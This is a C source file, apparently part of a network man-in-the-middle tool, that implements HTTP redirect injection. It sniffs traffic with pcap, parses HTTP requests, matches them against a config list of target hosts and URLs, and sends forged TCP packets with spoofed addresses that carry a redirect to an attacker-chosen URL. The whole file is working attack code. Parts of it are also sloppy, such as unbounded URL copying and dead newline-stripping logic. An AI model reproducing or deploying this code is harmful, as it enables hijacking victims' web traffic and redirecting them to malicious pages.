#define HAVE_REMOTE

#include <pcap.h>

#include <stdio.h>
#include <Windows.h>
#include <Shlwapi.h>
#include <stdint.h>

#include "APE.h"
#include "HttpInjection.h"
#include "LinkedListHttpInjections.h"


extern PHTTPINJECTIONNODE gHttpInjectionList;


/*
 *
 *
 */
int InjectHttpReply(pcap_t * ifcHandleParam, unsigned char *dataParam, int dataLengthParam)
{
  int retVal = NOK;
  int ipHdrLen = -1;
  int tcpHdrLen = -1;
  int totalLength = -1;
  int dataLength = -1;
  int i = -1;
  PETHDR ethrHdr = (PETHDR)dataParam;
  PIPHDR ipHdr = NULL;
  PTCPHDR tcpHdr = NULL;
  char request[MAX_BUF_SIZE + 2];
  char *dPtr = NULL;
  HTTPREQ httpRequest;
  PHTTPINJECTIONNODE node = NULL;


  if (dataParam != NULL && htons(ethrHdr->ether_type) == ETHERTYPE_IP)
  {
    ipHdr = (PIPHDR)(dataParam + sizeof(ETHDR));
    ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;

    if (ipHdr != NULL && ipHdr->proto == IP_PROTO_TCP)
    {
      tcpHdr = (PTCPHDR)((unsigned char*)ipHdr + ipHdrLen);

      tcpHdrLen = (tcpHdr->doff * 4);
      totalLength = ntohs(ipHdr->tlen);
      dataLength = totalLength - ipHdrLen - tcpHdrLen;


      if (dataLength > 10 && tcpHdr->psh == 1)
      {
        ZeroMemory(request, sizeof(request));
        dPtr = (char *)tcpHdr + tcpHdrLen;


        for (i = 0; i < dataLength && i < MAX_BUF_SIZE && dPtr != NULL; i++, dPtr++)
        {
          if (dPtr[0] > 31 && dPtr[0] < 127)
            request[i] = dPtr[0];
          else if (dPtr[0] == '\n')
            request[i] = '\n';
          else if (dPtr[0] == '\r')
            request[i] = '\r';
          else
            request[i] = ' ';
        }


        ZeroMemory(&httpRequest, sizeof(httpRequest));
        if (ParseRequest(request, &httpRequest) == OK)
        {
          if ((node = GetNodeByRequestedUrl(gHttpInjectionList, (unsigned char *)httpRequest.Host, (unsigned char *)httpRequest.URL)) != NULL)
          {
            if ((retVal = SendRedirect(ethrHdr, ipHdr, tcpHdr, (char *)node->sData.RedirectedURL, ifcHandleParam, dataLengthParam)) == OK)
              LogMsg(DBG_INFO, "HTTP Injection suceeded : %s%s -> %s", node->sData.RequestedHost, node->sData.RequestedURL, node->sData.RedirectedURL);
            else
              LogMsg(DBG_INFO, "HTTP Injection failed : %s%s -> %s", node->sData.RequestedHost, node->sData.RequestedURL, node->sData.RedirectedURL);

          }
        }
      }
    }
  }

  return retVal;
}



/*
 *
 *
 */
int ParseRequest(char *request, PHTTPREQ httpRequest)
{
  int retVal = NOK;
  int count = 0;
  int len = 0;
  char *tmpDataPtr = request;
  char *endPtr = NULL;
  char *newLines   = "\r\n";
  char *tmpPtr = NULL;

  if (request != NULL && httpRequest != NULL)
  {
    // Determine HTTP method
    if (!strncmp(tmpDataPtr, "GET", 3))
    {
      strcpy(httpRequest->Method, "GET");
    }
    else if (!strncmp(tmpDataPtr, "POST", 4))
    {
      strcpy(httpRequest->Method, "POST");
    }
    else if (!strncmp(tmpDataPtr, "TRACE", 5))
    {
      strcpy(httpRequest->Method, "TRACE");
    }
    else if (!strncmp(tmpDataPtr, "OPTIONS", 7))
    {
      strcpy(httpRequest->Method, "OPTIONS");
    }

    // Determine URL
    if ((len = strnlen(httpRequest->Method, sizeof(httpRequest->Method))) > 0)
    {
      tmpDataPtr += len + 1;

      for (count = 0; count < 512 && *tmpDataPtr != ' '; count++, tmpDataPtr++)
      {
        httpRequest->URL[count] = tmpDataPtr[0];
      }
    }

    // Determine Host
    if ((tmpDataPtr = strstr(request, "\nHost: ")) != NULL || (tmpDataPtr = strstr(request, "\rHost: ")) != NULL)
    {
      tmpDataPtr += 7;
      if ((endPtr = strchr(tmpDataPtr, '\n')) != NULL)
      {
        if (endPtr - tmpDataPtr < 128)
        {
          strncpy(httpRequest->Host, tmpDataPtr, endPtr - tmpDataPtr);
          if (strpbrk(httpRequest->Host, "\n\r") != NULL)
          {
            tmpPtr = strpbrk(httpRequest->Host, "\n\r"); 
            tmpPtr = NULL;
          }

          httpRequest->Host[strnlen(httpRequest->Host, sizeof(httpRequest->Host)-1)-1] = 0;
        }
      }
    }
  }

  if (httpRequest->Host[0] != 0 && httpRequest->Method[0] != 0 && httpRequest->URL[0] != 0)
    retVal = OK;

  return retVal;
}



/*
 *
 *
 */
void ParseHTMLInjectionConfigFile(char *configFile)
{
  FILE *fileHandle = NULL;
  char tmpLine[MAX_BUF_SIZE + 1];
  unsigned char requestedHost[MAX_BUF_SIZE + 1];
  unsigned char requestedUrl[MAX_BUF_SIZE + 1];
  unsigned char redirectedUrl[MAX_BUF_SIZE + 1];

  if (configFile != NULL && (fileHandle = fopen(configFile, "r")) != NULL)
  {
    ZeroMemory(tmpLine, sizeof(tmpLine));
    ZeroMemory(requestedHost, sizeof(requestedHost));
    ZeroMemory(requestedUrl, sizeof(requestedUrl));
    ZeroMemory(redirectedUrl, sizeof(redirectedUrl));

    while (fgets(tmpLine, sizeof(tmpLine), fileHandle) != NULL)
    {
      while (tmpLine[strlen(tmpLine)-1] == '\r' || tmpLine[strlen(tmpLine)-1] == '\n')
        tmpLine[strlen(tmpLine)-1] = '\0';

      // parse values and add them to the list.
      if (sscanf(tmpLine, "%[^,],%[^,],%s", requestedHost, requestedUrl, redirectedUrl) == 3)
        AddItemToList(&gHttpInjectionList, requestedHost, requestedUrl, redirectedUrl);

      ZeroMemory(tmpLine, sizeof(tmpLine));
      ZeroMemory(requestedHost, sizeof(requestedHost));
      ZeroMemory(requestedUrl, sizeof(requestedUrl));
      ZeroMemory(redirectedUrl, sizeof(redirectedUrl));
    }

    fclose(fileHandle);
  }
}




/*
 *
 *
 */
int SendRedirect(PETHDR ethHdr, PIPHDR ipHdr, PTCPHDR pTCPHdr, char *replacementUrl, pcap_t *ifcHandle, int dataLen)
{
  int retVal = NOK;
  unsigned char checker[1024];
  unsigned char packet[1024];
  PPSEUDOHDR pseudoHdr = (PPSEUDOHDR) checker;
  unsigned char redirBuf[MAX_BUF_SIZE + 1];
  int redirBufLen = 0;
  int ipHdrLen = -1;
  ETHDR newEther;
  IPHDR newIpHdr;
  TCPHDR newTcpHdr;

  ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;
  if (ethHdr != NULL && ipHdr != NULL && pTCPHdr != NULL)
  {
    // Prepare redirect buffer
    ZeroMemory(redirBuf, sizeof(redirBuf));
    snprintf((char *) redirBuf, sizeof(redirBuf)-1, FORWARDHEADER, replacementUrl);
    redirBufLen = strnlen((char *) redirBuf, sizeof(redirBuf)-1);

    // Ether layer
    ZeroMemory(&newEther, sizeof(newEther));
    CopyMemory(newEther.ether_shost, ethHdr->ether_dhost, BIN_MAC_LEN);   
    CopyMemory(newEther.ether_dhost, ethHdr->ether_shost, BIN_MAC_LEN);
    newEther.ether_type = htons(0x0800);


    // IP layer
    ZeroMemory(&newIpHdr, sizeof(newIpHdr));
    CopyMemory(&newIpHdr.daddr, &ipHdr->saddr, BIN_IP_LEN);
    CopyMemory(&newIpHdr.saddr, &ipHdr->daddr, BIN_IP_LEN);

    newIpHdr.proto = 6;
    newIpHdr.flags_fo = htons(0x4000); //For TCP Flag fixed
    newIpHdr.identification = htons(GetRandomInt(1000, 65536));    //Any number
    newIpHdr.tlen = htons(sizeof(IPHDR) + sizeof(TCPHDR) + redirBufLen);      // IPLength + TCPLength + DataLength
    newIpHdr.tos = 0;
    newIpHdr.ttl = 127;
    newIpHdr.ver_ihl = 0x45;  //Version (v4) and  header length(5 nibbles)
    newIpHdr.crc = ComputeChecksum((unsigned short *) &newIpHdr, sizeof(IPHDR));

    // Create TCP Header
    newTcpHdr.sport = pTCPHdr->dport; 
    newTcpHdr.dport = pTCPHdr->sport; 
    newTcpHdr.ack_seq = htonl(ntohl(pTCPHdr->seq) + dataLen); // pTCPHdr->seq + htonl(sizeof(TCPHDR) + lRedirBufLen);
    newTcpHdr.seq = pTCPHdr->ack_seq;

    newTcpHdr.ack = 1;
    newTcpHdr.syn = 0;
    newTcpHdr.psh = 1;
    newTcpHdr.fin = 1;
    newTcpHdr.urg = 0;
    newTcpHdr.rst = 0;

    newTcpHdr.res1 = pTCPHdr->res1;
    newTcpHdr.doff = 0x5;
    newTcpHdr.urg_ptr = 0; 
    newTcpHdr.window = pTCPHdr->window;   
    newTcpHdr.check = 0; // For the sake of creating the TCP checksum the checksum field has to be 0. 


    // Calc. TCP checksum
    ZeroMemory(checker, sizeof(checker));
    CopyMemory(&pseudoHdr->saddr, &newIpHdr.saddr, sizeof(pseudoHdr->saddr));
    CopyMemory(&pseudoHdr->daddr, &newIpHdr.daddr, sizeof(pseudoHdr->daddr));
    pseudoHdr->proto = newIpHdr.proto;
    pseudoHdr->zero = 0;
    pseudoHdr->tcp_len = htons(sizeof(TCPHDR) + redirBufLen); //Length of Tcp header + Data in OCTATES
    CopyMemory(&pseudoHdr->tcp, &newTcpHdr, sizeof(TCPHDR));
    CopyMemory(pseudoHdr->payload, redirBuf, redirBufLen);


    newTcpHdr.check = ComputeChecksum((unsigned short *) pseudoHdr, sizeof(PSEUDOHDR) - sizeof((PPSEUDOHDR)NULL)->payload + redirBufLen);


    ZeroMemory(packet, sizeof(packet));
    // Ethernet layer
    CopyMemory(packet, &newEther, sizeof(ETHDR));
    // IP layer
    CopyMemory(&packet[sizeof(ETHDR)], &newIpHdr, sizeof(IPHDR));
    // TCP layer
    CopyMemory(&packet[sizeof(ETHDR) + sizeof(IPHDR)], &newTcpHdr, sizeof(TCPHDR));
    // Layer 7, Payload
    CopyMemory(&packet[sizeof(ETHDR) + sizeof(IPHDR)] + sizeof(TCPHDR), redirBuf, redirBufLen);

    if (pcap_sendpacket(ifcHandle, packet, sizeof(ETHDR) + sizeof(IPHDR) + sizeof(TCPHDR) + redirBufLen) == 0)
      retVal = OK;
  }

  return retVal;
}


/*
 *
 *
 */
unsigned short ComputeChecksum (unsigned short *dataPtrParam, int dataLenParam)
{
  unsigned short retVal = 0;
  register unsigned short *lPtr = dataPtrParam;
  register int checkSum = 0;
  register int dataLeft = dataLenParam;
  int i = 0;

  while (dataLeft > 1)
  {
    checkSum += *lPtr++;
    dataLeft -= 2;
  }

  // mop up an odd byte, if necessary 
  if (dataLeft == 1)
  {
    *(unsigned char *) (&retVal) = *(unsigned char *) lPtr;
    checkSum += retVal;
  }

  // add back carry outs from top 16 bits to low 16 bits
  checkSum = (checkSum >> 16) + (checkSum &0xffff); 
  checkSum += (checkSum >> 16); 
  retVal = ~checkSum; 

  return retVal;
}


/*
 *
 *
 */
unsigned int GetRandomInt(unsigned int min, unsigned int max)
{
  return (rand()%(max-min)+min);
}
